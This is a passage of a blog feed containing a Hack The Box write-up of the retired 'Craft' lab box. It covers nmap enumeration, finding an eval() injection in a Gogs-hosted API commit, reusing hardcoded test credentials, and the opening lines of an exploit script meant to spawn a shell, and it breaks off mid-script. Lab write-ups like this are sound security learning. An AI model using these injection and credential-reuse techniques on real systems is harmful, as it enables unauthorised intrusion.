-&lt;br /&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/player/&quot;&gt;Hack The Box - Player&lt;/a&gt;&lt;/p&gt;</content><author><name>0xRick</name></author><category term="hack-the-box" /><category term="linux" /><category term="web" /><category term="ssh" /><category term="rce" /><category term="php" /><category term="reverse-engineering" /><category term="git" /><category term="postgresql" /><summary type="html">Hack The Box - Bitlab</summary></entry><entry><title type="html">Hack The Box - Craft</title><link href="https://0xrick.github.io/hack-the-box/craft/" rel="alternate" type="text/html" title="Hack The Box - Craft" /><published>2020-01-04T07:00:00+02:00</published><updated>2020-01-04T07:00:00+02:00</updated><id>https://0xrick.github.io/hack-the-box/craft</id><content type="html" xml:base="https://0xrick.github.io/hack-the-box/craft/">&lt;h1 id=&quot;hack-the-box---craft&quot;&gt;Hack The Box - Craft&lt;/h1&gt;
-
-&lt;h2 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h2&gt;
-&lt;p&gt;Hey guys, today Craft retired and here’s my write-up about it. It’s a medium rated Linux box and its ip is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.10.10.110&lt;/code&gt;, I added it to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;craft.htb&lt;/code&gt;. Let’s jump right in !&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/craft/0.png&quot; alt=&quot;&quot; class=&quot;align-center&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;nmap&quot;&gt;Nmap&lt;/h2&gt;
-&lt;p&gt;As always we will start with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services:&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/craft# nmap -sV -sT -sC -o nmapinitial craft.htb
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-03 13:41 EST
-Nmap scan report for craft.htb (10.10.10.110)
-Host is up (0.22s latency).
-Not shown: 998 closed ports
-PORT    STATE SERVICE  VERSION
-22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
-| ssh-hostkey: 
-|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
-|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
-|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
-443/tcp open  ssl/http nginx 1.15.8
-|_http-server-header: nginx/1.15.8
-|_http-title: About
-| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
-| Not valid before: 2019-02-06T02:25:47
-|_Not valid after:  2020-06-20T02:25:47
-|_ssl-date: TLS randomness does not represent time
-| tls-alpn: 
-|_  http/1.1
-| tls-nextprotoneg: 
-|_  http/1.1
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 75.97 seconds
-root@kali:~/Desktop/HTB/boxes/craft# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;We got &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https&lt;/code&gt; on port 443 and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh&lt;/code&gt; on port 22.&lt;br /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h2&gt;
-&lt;p&gt;The home page was kinda empty, Only the about info and nothing else:
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/craft/1.png&quot; alt=&quot;&quot; class=&quot;align-center&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
-The navigation bar had two external links, one of them was to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://api.craft.htb/api/&lt;/code&gt; and the other one was to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://gogs.craft.htb&lt;/code&gt;:&lt;/p&gt;
-&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;ul&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;nav navbar-nav pull-right&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-            &lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://api.craft.htb/api/&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;API&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
-            &lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://gogs.craft.htb/&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;border=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;alt=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Git&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/static/img/Git-Icon-Black.png&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;20&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;height=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;20&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
-          &lt;span class=&quot;nt&quot;&gt;&amp;lt;/ul&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;So I added both of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;api.craft.htb&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gogs.craft.htb&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; then I started checking them.&lt;br /&gt;
-&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://api.craft.htb/api&lt;/code&gt;:
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/craft/2.png&quot; alt=&quot;&quot; class=&quot;align-center&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;Here we can see the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;API&lt;/code&gt; endpoints and how to interact with them.&lt;br /&gt;
-We’re interested in the authentication part for now, there are two endpoints, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/auth/check&lt;/code&gt; which checks the validity of an authorization token and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/auth/login&lt;/code&gt; which creates an authorization token provided valid credentials.&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/craft/3.png&quot; alt=&quot;&quot; class=&quot;align-center&quot; /&gt;&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/craft/4.png&quot; alt=&quot;&quot; class=&quot;align-center&quot; /&gt;&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/craft/5.png&quot; alt=&quot;&quot; class=&quot;align-center&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
-We don’t have credentials to authenticate so let’s keep enumerating.&lt;br /&gt;
-Obviously &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gogs.craft.htb&lt;/code&gt; had &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gogs&lt;/code&gt; running:
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/craft/6.png&quot; alt=&quot;&quot; class=&quot;align-center&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;The repository of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;API&lt;/code&gt; source code was publicly accessible so I took a look at the code and the commits.&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/craft/7.png&quot; alt=&quot;&quot; class=&quot;align-center&quot; /&gt;&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/craft/8.png&quot; alt=&quot;&quot; class=&quot;align-center&quot; /&gt;&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/craft/9.png&quot; alt=&quot;&quot; class=&quot;align-center&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
-Dinesh’s commits &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c414b16057&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10e3ba4f0a&lt;/code&gt; had some interesting stuff. First one had some code additions to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/brew/endpoints/brew.py&lt;/code&gt; where user’s input is being passed to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eval()&lt;/code&gt; without filtering:
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/craft/10.png&quot; alt=&quot;&quot; class=&quot;align-center&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;@@&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@@&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;BrewCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Resource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-         &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
-         Creates a new brew entry.
-         &quot;&quot;&quot;&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;create_brew&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;201&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;        &lt;span class=&quot;c1&quot;&gt;# make sure the ABV value is sane.
-&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'%s &amp;gt; 1'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'abv'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]):&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ABV must be a decimal value less than 1.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;create_brew&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;201&lt;/span&gt;
- &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/&amp;lt;int:id&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
- &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;api&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;404&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Brew not found.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;I took a look at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;API&lt;/code&gt; documentation again to find in which request I can send the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;abv&lt;/code&gt; parameter:
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/craft/11.png&quot; alt=&quot;&quot; class=&quot;align-center&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;As you can see we can send a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POST&lt;/code&gt; request to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/brew&lt;/code&gt; and inject our payload in the parameter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;abv&lt;/code&gt;, However we still need an authorization token to be able to interact with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/brew&lt;/code&gt;, and we don’t have any credentials.&lt;br /&gt;
-The other commit was a test script which had hardcoded credentials, exactly what we need:
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/craft/12.png&quot; alt=&quot;&quot; class=&quot;align-center&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'https://api.craft.htb/api/auth/login'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;auth&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'dinesh'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'4aUh0A8PbVJxgd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;verify&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json_response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;json_response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'token'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'X-Craft-API-Token'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Content-Type'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'application/json'&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;# make sure token is valid
-&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'https://api.craft.htb/api/auth/check'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;verify&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;I tested the credentials and they were valid:
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/craft/13.png&quot; alt=&quot;&quot; class=&quot;align-center&quot; /&gt;&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/craft/14.png&quot; alt=&quot;&quot; class=&quot;align-center&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;rce--shell-on-docker-container&quot;&gt;RCE –&amp;gt; Shell on Docker Container&lt;/h2&gt;
-&lt;p&gt;I wrote a small script to authenticate, grab the token, exploit the vulnerability and spawn a shell.&lt;br /&gt;
-&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit.py&lt;/code&gt;:&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3 
-&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;json&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;subprocess&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Popen&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urllib3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;disable_warnings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urllib3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exceptions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InsecureRequestWarning&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;GREEN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[32m&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[93m&quot;&lt;/span&gt; 
-
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'https://api.craft.htb/api/auth/login'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;auth&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'dinesh'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'4aUh0A8PbVJxgd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;verify&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'token'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
-
